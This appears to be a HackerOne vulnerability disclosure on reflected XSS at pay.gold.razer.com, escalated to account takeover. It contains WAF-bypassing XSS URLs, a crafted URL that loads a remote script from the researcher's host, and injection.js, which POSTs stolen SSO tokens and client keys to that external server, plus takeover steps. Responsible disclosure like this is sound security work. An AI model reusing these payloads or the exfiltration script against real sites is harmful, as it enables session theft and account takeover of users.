title: Reflected XSS at https://pay.gold.razer.com escalated to account takeover
vulnerability_information:
## Summary:
Due to the **parameter err is injected to the body** of the page without any sanitization a victim could be tricked to visit the page and get his account stolen.

## Steps To Reproduce:
  1.Visit the specially crafted url (Firefox | IE11) https://pay.gold.razer.com/Error/Uyt2ZXF0UjZLM0dvMHA4eUFHMDVoZEtrdWxjdzNTeTlYMnpLR0NiOVRmND0?err=%3Csvg%20onpointerenter=z=alert,z`corraldev`%3E

 2.Move your pointer around the center of the page, near of continue button. An alert should appears

## Supporting Material/References:
  {F618130}

## Impact

Fortunately the WAF can evade most of the XSS payloads but with the bypass that i have used an attacker can execute scripts at a victim's session and take over his account, start a phising campaign and steal ( paypal accounts or credit card numbers ), force users to download malware, and a lot of advanced attacks.
vulnerability_information_html:
Summary:

Due to the parameter err is injected to the body of the page without any sanitization a victim could be tricked to visit the page and get his account stolen.

Steps To Reproduce:

1.Visit the specially crafted url (Firefox | IE11) https://pay.gold.razer.com/Error/Uyt2ZXF0UjZLM0dvMHA4eUFHMDVoZEtrdWxjdzNTeTlYMnpLR0NiOVRmND0?err=%3Csvg%20onpointerenter=z=alert,z%60corraldev%60%3E

2.Move your pointer around the center of the page, near of continue button. An alert should appears

Supporting Material/References:

Impact

Fortunately the WAF can evade most of the XSS payloads but with the bypass that i have used an attacker can execute scripts at a victim's session and take over his account, start a phising campaign and steal ( paypal accounts or credit card numbers ), force users to download malware, and a lot of advanced attacks.

activities.message:
Hi @chessmast3r,
I have investigated this security issue a bit more to find a way to **execute the script without user interaction**.
I have notice that the *marquee* tag is allowed by the WAF and the param *onStart* isn't blocked so when user loads the page the *onStart* payload is executed. 

PoC *( Firefox / IE )*
https://pay.gold.razer.com/Error?err=%3Cmarquee+loop=0+width=0+onstart=z=alert,z(document.domain)%3E
{F619935}

Considering that the token of the user is stored at the DOM and now we can achieve the script execution without interaction of the user, **is this a raise of the severity of the vulnerability?**
activities.markdown_message:
Hi @chessmast3r,
I have investigated this security issue a bit more to find a way to execute the script without user interaction.
I have notice that the marquee tag is allowed by the WAF and the param onStart isn't blocked so when user loads the page the onStart payload is executed.

PoC ( Firefox / IE )
https://pay.gold.razer.com/Error?err=%3Cmarquee+loop=0+width=0+onstart=z=alert,z(document.domain)%3E

Considering that the token of the user is stored at the DOM and now we can achieve the script execution without interaction of the user, is this a raise of the severity of the vulnerability?

Update

We can load remote javascript files and due to the fact that client_id and client_key is stored at the var _params in the DOM, we can use that params and the sso library loaded in the page to send a request to the API, get all the user information like access_token, account, nickname, uuid and another confidential info and send it to the attacker server.

I have written a script to demonstrate this scenario ( attached to this message ), this script will be loaded remotely with the following crafted url
https://pay.gold.razer.com/Error?err=%3Cmarquee+loop=0+width=0+onstart=$.getScript(%27https://corraldev.000webhostapp.com/reports/723060/injection.js%27)%3E

The script hooks a function that the sso library calls when user data is responded from the server, initialize the sso library and force it to make the verify request.

injection.js

/**
 * This script is only for the PoC for #723060 @hackerone to razer.com
 */

razerInjection = () => {

    // Hook the function fired after the rz.verify.
    window.setInfo = (data) => {
        var pst= [data,_params];
        var xhr = new XMLHttpRequest();
        xhr.open('POST','https://corraldev.000webhostapp.com/gold.razer/');
        xhr.send(JSON.stringify(pst))
        console.log('Stolen information ', pst);
    };

    window.rz.init(_params);
    window.rz.verify();

}
razerInjection();

To sum up

Attacker can achieve an account takeover through this XSS issue.
Thank you for your attention!

activities.message:
HI @corraldev, 

This report is triaged as reflected XSS, if you believe "==Attacker can achieve an account takeover through this XSS issue==" it's better to submit working POC showing the takeover. 

Regards.

activities.message:
Hi again @chessmast3r,
## Account takeover via Reflected XSS
## POC
First **we need two accounts** to verify this account take over, A( Attacker ) and B ( Victim )

1.Login to account **A** in Chrome
2.Login to account **B** in firefox
3.Open from account **B** the specially crafted url
https://pay.gold.razer.com/Error?err=%3Cmarquee+loop=0+width=0+onstart=$.getScript(%27https://corraldev.000webhostapp.com/reports/723060/injection.js%27)%3E
4.Open & copy the **B** stolen session from https://corraldev.000webhostapp.com/723060/last_session.json
5.Start burp intruder and config it to intercept the response of the POST from
https://oauth2.razer.com/services/sso ( *as shown in the video attached* )
6.From **B** account open https://gold.razer.com
7.Repace the original response of https://oauth2.razer.com/services/sso and paste the victim's session.
8.Now you have taken over the B account.

-- 
Note: I can provide you the credentials of my two accounts used in the video to check this.
activities.markdown_message:
Hi again @chessmast3r,

Account takeover via Reflected XSS

POC

First we need two accounts to verify this account take over, A( Attacker ) and B ( Victim )

1.Login to account A in Chrome
2.Login to account B in firefox
3.Open from account B the specially crafted url
https://pay.gold.razer.com/Error?err=%3Cmarquee+loop=0+width=0+onstart=$.getScript(%27https://corraldev.000webhostapp.com/reports/723060/injection.js%27)%3E
4.Open & copy the B stolen session from https://corraldev.000webhostapp.com/723060/last_session.json
5.Start burp intruder and config it to intercept the response of the POST from
https://oauth2.razer.com/services/sso ( as shown in the video attached )
6.From B account open https://gold.razer.com
7.Repace the original response of https://oauth2.razer.com/services/sso and paste the victim's session.
8.Now you have taken over the B account.

--
Note: I can provide you the credentials of my two accounts used in the video to check this.

activities.message:
I made a mistake in the PoC, at step 6. **You have to open https://gold.razer.com from the attacker browser.**

Im so sorry for that. Best regards @corraldev

activities.message: Thank you for helping Razer secure its customers' information.  The response to our program has been far more enthusiastic than originally expected.  Our target to award bounties is 15 days from triage and we know it has been much longer than that.  Please accept our apologies for the very lengthy delay in payout.
